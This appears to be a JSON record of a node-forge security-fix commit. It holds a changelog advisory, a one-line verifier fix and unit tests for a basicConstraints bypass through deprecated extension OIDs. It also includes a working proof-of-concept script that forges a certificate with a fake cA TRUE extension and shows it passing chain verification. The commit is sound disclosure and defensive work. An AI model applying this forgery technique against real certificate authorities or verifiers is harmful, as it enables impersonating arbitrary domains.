{"id":"GHSA-5x38-2vff-x55p","axis":"advisories","repo":"digitalbazaar/forge","sha":"58c06bc251856b409c30ecb35a93f5f6c9bbc84a","parsed":{"files":[{"path":"CHANGELOG.md","lines":["@@ -104,6 +104,19 @@ Forge ChangeLog","     Research.","   - CVE ID: [CVE-TBD]()","   - GHSA ID: [GHSA-jc66-7q78-782g](https://github.com/digitalbazaar/forge/security/advisories/GHSA-jc66-7q78-782g)","+- **HIGH**: `basicConstraints` bypass via deprecated extension OIDs in","+  certificate chain verification.","+  - node-forge parses extensions with the deprecated OIDs `2.5.29.10` and","+    `2.5.29.13` as `basicConstraints`, and `pki.verifyCertificateChain()`","+    used the first extension with that name. A certificate with a forged","+    deprecated-OID extension (`cA` TRUE) before its genuine `basicConstraints`","+    extension (`cA` FALSE) is accepted as a CA, and the same technique can","+    hide a `pathLenConstraint`. An attacker who obtains such a certificate","+    from a trusted CA that copies extensions from certificate requests can","+    issue certificates for any name that node-forge accepts as valid.","+  - Reported by @nickcollisson-workos (WorkOS Security Team).","+  - CVE ID: [CVE-TBD]()","+  - GHSA ID: [GHSA-5x38-2vff-x55p](https://github.com/digitalbazaar/forge/security/advisories/GHSA-5x38-2vff-x55p)"," - **MODERATE**: Denial of service in the TLS client when the server sends no","   certificate.","   - A NULL Pointer Dereference (CWE-476) vulnerability in node-forge versions","@@ -161,6 +174,9 @@ Forge ChangeLog"," - [pbe] Reject iteration counts less than one in the PKCS#12 key derivation","   function `pbe.generatePkcs12Key()` (also `pkcs12.generateKey()`), used for","   PKCS#12 MACs and PKCS#12 password-based encryption.","+- [x509] Use only the RFC 5280 `basicConstraints` OID (`2.5.29.19`) in","+  certificate chain verification, not the deprecated OIDs that are also","+  parsed as `basicConstraints`."," "," ## 1.4.0 - 2026-03-24"," "],"additions":16,"deletions":0,"truncated":false},{"path":"lib/x509.js","lines":["@@ -3149,7 +3149,9 @@ pki.verifyCertificateChain = function(caStore, chain, options) {","     if(error === null &&","       (!first || (chain.length === 0 && (!parent || selfSigned)))) {","       // first check keyUsage extension and then basic constraints","-      var bcExt = cert.getExtension('basicConstraints');","+      // (by id: deprecated OIDs are also named 'basicConstraints', but only","+      // id-ce-basicConstraints 2.5.29.19 is valid, RFC 5280 4.2.1.9)","+      var bcExt = cert.getExtension({id: '2.5.29.19'});","       var keyUsageExt = cert.getExtension('keyUsage');","       if(keyUsageExt !== null) {","         // keyCertSign must be true and there must be a basic"],"additions":3,"deletions":1,"truncated":false},{"path":"tests/pocs/ghsa-5x38-2vff-x55p.js","lines":["@@ -0,0 +1,64 @@","+// Security Advisory PoC","+//","+// https://github.com/digitalbazaar/forge/security/advisories/GHSA-5x38-2vff-x55p","+//","+// WorkOS Security Team (@nickcollisson-workos)","+","+const forge = require('../..');","+const { pki, asn1 } = forge;","+","+const rootKeys = pki.rsa.generateKeyPair({ bits: 1024 });","+const eeKeys = pki.rsa.generateKeyPair({ bits: 1024 });","+const leafKeys = pki.rsa.generateKeyPair({ bits: 1024 });","+","+function makeCert(serial, subject, issuer, publicKey, signingKey, extensions) {","+  const cert = pki.createCertificate();","+  cert.publicKey = publicKey;","+  cert.serialNumber = serial;","+  cert.validity.notBefore = new Date('2026-01-01T00:00:00Z');","+  cert.validity.notAfter = new Date('2027-01-01T00:00:00Z');","+  cert.setSubject([{ name: 'commonName', value: subject }]);","+  cert.setIssuer([{ name: 'commonName', value: issuer }]);","+  if (extensions) cert.setExtensions(extensions);","+  cert.sign(signingKey, forge.md.sha256.create());","+  // round-trip through PEM: the verifier only sees serialized bytes","+  return pki.certificateFromPem(pki.certificateToPem(cert));","+}","+","+// BasicConstraints ::= SEQUENCE { cA TRUE }, under the deprecated OID 2.5.29.10","+const forgedBc = {","+  id: '2.5.29.10',","+  critical: false,","+  value: asn1","+    .toDer(","+      asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [","+        asn1.create(asn1.Class.UNIVERSAL, asn1.Type.BOOLEAN, false, String.fromCharCode(0xff)),","+      ]),","+    )","+    .getBytes(),","+};","+const genuineBc = { name: 'basicConstraints', cA: false };","+","+const root = makeCert('01', 'Root CA', 'Root CA', rootKeys.publicKey, rootKeys.privateKey, [","+  { name: 'basicConstraints', cA: true, critical: true },","+]);","+const caStore = pki.createCaStore([root]);","+","+// end-entity certs issued by the root; leaf signed by the end-entity key","+const control = makeCert('02', 'end-entity', 'Root CA', eeKeys.publicKey, rootKeys.privateKey, [genuineBc]);","+const attack = makeCert('02', 'end-entity', 'Root CA', eeKeys.publicKey, rootKeys.privateKey, [forgedBc, genuineBc]);","+const leaf = makeCert('03', 'victim.example.com', 'end-entity', leafKeys.publicKey, eeKeys.privateKey);","+","+function verify(ee) {","+  try {","+    pki.verifyCertificateChain(caStore, [leaf, ee]);","+    return 'VERIFIED';","+  } catch (e) {","+    return 'REJECTED (' + e.error + ')';","+  }","+}","+","+console.log('control (genuine cA=false only):', verify(control));","+console.log('attack  (+ forged 2.5.29.10)   :', verify(attack));","+const bc = attack.getExtension('basicConstraints');","+console.log('getExtension(basicConstraints) : id=' + bc.id + ' cA=' + bc.cA);"],"additions":64,"deletions":0,"truncated":false},{"path":"tests/unit/x509.js","lines":["@@ -1613,6 +1613,73 @@ var UTIL = require('../../lib/util');","         }","       );","     });","+","+    it('should ignore deprecated basicConstraints OIDs in chain verification', function() {","+      // see GHSA-5x38-2vff-x55p and PoC in /tests/pocs/","+      function checkError(regex) {","+        return function(err) {","+          return regex.test(err.message) &&","+            err.error === 'forge.pki.BadCertificate';","+        };","+      }","+","+      // root <- non-CA with forged 2.5.29.10 {cA TRUE} before the genuine","+      // 2.5.29.19 {cA FALSE} <- leaf","+      ASSERT.throws(function() {","+        verifyBasicConstraintsChain([[","+          {id: '2.5.29.10', cA: true},","+          {id: '2.5.29.19', cA: false}","+        ]]);","+      }, checkError(/basicConstraints indicates the certificate is not a CA/));","+","+      // same with the deprecated OID 2.5.29.13","+      ASSERT.throws(function() {","+        verifyBasicConstraintsChain([[","+          {id: '2.5.29.13', cA: true},","+          {id: '2.5.29.19', cA: false}","+        ]]);","+      }, checkError(/basicConstraints indicates the certificate is not a CA/));","+","+      // root <- non-CA with only a forged 2.5.29.10 {cA TRUE} <- leaf","+      ASSERT.throws(function() {","+        verifyBasicConstraintsChain([[{id: '2.5.29.10', cA: true}]]);","+      }, checkError(/missing basicConstraints extension/));","+","+      // root <- CA with forged 2.5.29.10 {cA TRUE} before the genuine","+      // 2.5.29.19 {cA TRUE, pathLenConstraint 0} <- CA <- leaf","+      ASSERT.throws(function() {","+        verifyBasicConstraintsChain([[","+          {id: '2.5.29.10', cA: true},","+          {id: '2.5.29.19', cA: true, pathLenConstraint: 0},","+          {name: 'keyUsage', keyCertSign: true}","+        ], [","+          {id: '2.5.29.19', cA: true},","+          {name: 'keyUsage', keyCertSign: true}","+        ]]);","+      }, checkError(/pathLenConstraint violated/));","+    });","+","+    it('should verify chains using basicConstraints 2.5.29.19', function() {","+      // root <- CA <- leaf","+      ASSERT.equal(verifyBasicConstraintsChain([[","+        {name: 'basicConstraints', cA: true},","+        {name: 'keyUsage', keyCertSign: true}","+      ]]), true);","+","+      // root <- CA (pathLenConstraint 0) <- leaf","+      ASSERT.equal(verifyBasicConstraintsChain([[","+        {id: '2.5.29.19', cA: true, pathLenConstraint: 0},","+        {name: 'keyUsage', keyCertSign: true}","+      ]]), true);","+","+      // root <- CA with a deprecated 2.5.29.10 {cA FALSE} before the genuine","+      // 2.5.29.19 {cA TRUE} <- leaf","+      ASSERT.equal(verifyBasicConstraintsChain([[","+        {id: '2.5.29.10', cA: false},","+        {id: '2.5.29.19', cA: true},","+        {name: 'keyUsage', keyCertSign: true}","+      ]]), true);","+    });","   });"," ","   // TODO: add sha-512 and sha-256 fingerprint tests","@@ -1983,4 +2050,44 @@ var UTIL = require('../../lib/util');"," ","     return cert;","   }","+","+  // creates a root CA, one certificate per given extensions list (each","+  // issued by the previous one, the first by the root) and a leaf issued by","+  // the last one, then verifies the chain","+  function verifyBasicConstraintsChain(extensionsList) {","+    var keys = {","+      privateKey: PKI.privateKeyFromPem(_pem.privateKey),","+      publicKey: PKI.publicKeyFromPem(_pem.publicKey)","+    };","+    function issue(subject, issuer, serialNumber, extensions) {","+      var cert = PKI.createCertificate();","+      cert.publicKey = keys.publicKey;","+      cert.serialNumber = '0' + serialNumber;","+      cert.validity.notBefore = new Date();","+      cert.validity.notAfter = new Date();","+      cert.validity.notAfter.setFullYear(","+        cert.validity.notBefore.getFullYear() + 1);","+      cert.setSubject([{name: 'commonName', value: subject}]);","+      cert.setIssuer([{name: 'commonName', value: issuer}]);","+      cert.setExtensions(extensions);","+      cert.sign(keys.privateKey, MD.sha256.create());","+      // round-trip so that the parsed extensions are verified","+      return PKI.certificateFromPem(PKI.certificateToPem(cert));","+    }","+","+    var rootCert = issue('root', 'root', 1, [","+      {name: 'basicConstraints', cA: true},","+      {name: 'keyUsage', keyCertSign: true}","+    ]);","+    var chain = [];","+    var issuer = 'root';","+    for(var i = 0; i < extensionsList.length; ++i) {","+      var subject = 'cert' + i;","+      chain.unshift(issue(subject, issuer, i + 2, extensionsList[i]));","+      issuer = subject;","+    }","+    chain.unshift(issue('leaf', issuer, extensionsList.length + 2, []));","+","+    return PKI.verifyCertificateChain(PKI.createCaStore([rootCert]), chain);","+  }"," })();",""],"additions":107,"deletions":0,"truncated":false}],"additions":190,"deletions":1,"truncated":false,"file_count":4},"error":null,"fetched_at":"2026-10-31T14:35:26.173785+00:00"}